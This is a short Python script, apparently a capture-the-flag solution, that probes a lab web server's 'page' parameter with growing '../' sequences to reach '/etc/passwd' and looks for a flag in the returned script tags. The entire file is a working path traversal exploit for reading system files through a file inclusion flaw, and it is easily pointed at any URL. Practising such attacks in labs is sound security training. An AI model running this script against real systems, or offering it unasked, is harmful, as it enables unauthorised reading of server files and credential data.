import requests
from bs4 import BeautifulSoup
import time


timeout = time.time() + 10   # 10 secs from now
ip = 'http://10.12.250.125/?page='

def req_url(url):
    '''
    traverse an url and look for Nnon-404 status
    '''
    traversal = ""
    end = "etc/passwd"
    endpoint = url + end
    
    print("trying on ", endpoint)
    res = requests.get(endpoint)
    page_alert =  BeautifulSoup(res.text, "html.parser").find_all('script')
    while len(page_alert) > 0 and not 'flag' in page_alert[0].get_text():
        traversal += "../"
        endpoint = url + traversal + end
        res = requests.get(endpoint)
        print(f"\r trying: {endpoint}")

        page_alert =  BeautifulSoup(res.text, "html.parser").find_all('script')
        
        if len(page_alert) > 0 and 'flag' in page_alert[0].get_text():
            return {True : page_alert[0].get_text()}
        if time.time() > timeout:
            return {False: "could not find a flag"}

if __name__ == "__main__":
    print("trying the path traversal")
    res = req_url(ip)
    print(res)

